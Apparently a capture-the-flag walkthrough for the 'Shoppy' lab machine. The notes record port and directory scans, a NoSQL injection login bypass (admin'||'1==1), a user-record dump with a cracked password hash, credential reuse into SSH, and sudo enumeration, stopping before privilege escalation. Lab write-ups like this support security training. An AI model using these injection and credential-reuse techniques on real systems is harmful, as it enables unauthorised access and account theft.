## Enumeration


### NMAP

PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat


PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open  http     nginx 1.23.1
|_http-title:             Shoppy Wait Page        
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?


### Nikto

+ Server: nginx/1.23.1
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: GET, HEAD 
+ OSVDB-3092: /login/: This might be interesting...

### Gobuster(Dir scan)

/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]              
/admin                (Status: 302) [Size: 28] [--> /login]   
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]   
/Login                (Status: 200) [Size: 1074]              
/js                   (Status: 301) [Size: 171] [--> /js/]    
/fonts                (Status: 301) [Size: 177] [--> /fonts/] 
/Admin                (Status: 302) [Size: 28] [--> /login]  


Notes:
- /Admin, /Login and /login point to /login
- We cant go to other endpoints

### Gobuster(vhost scan)

gobuster vhost -w SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u shoppy.htb


Found: mattermost.shoppy.htb (Status: 200) [Size: 3122]



## Website (shoppy.htb)

- We got two interesting javascripts scripts:
	- main.js:
		- Logic behind the time
 	- plugins.js:
 		- jQuery || Zepto Parallax Plugin 
- NOTE: They do not have nothing

### Login

 - SQLMAP did not work
 - Try some NOSQL injection: admin'||'1==1 with a random password and we got admin

### Interface

 - Searching for Users we did the same Nosql injection and we got two users:
 	- [{"_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},
 	{"_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}]

 - Searching the josh hash 6ebcea65320589ca4f2f1ce039975995 in google we found that it corresponds to remembermethisway.
 - OR: hashcat -m 0 --show hash

## Website (mattermost.shoppy.htb)

 - Using josh username and password we got into mattermost.
 - We notice that we are in a group(Town Square) with 2 more persons(jaeger and jess)
 - Besides that we have other groups, lets explore that.

#### Coffee break
 - Download the image and tried to look at it using exiftool and binwalk but didnt find anything

#### Deploy Machine
 - We got some creds:
 	- username: jaeger password: Sh0ppyBest@pp!
 - WE GOT SSH SHELL WIth THOSES CREDS!!


## SSH

 - WE got the user.txt flag
 - Doing sudo -l we get the following entry:
 User jaeger may run the following commands on shoppy:
    (deploy) /home/deploy/password-manager
 - We can run the executable using: sudo -u deploy /home/deploy/password-manager


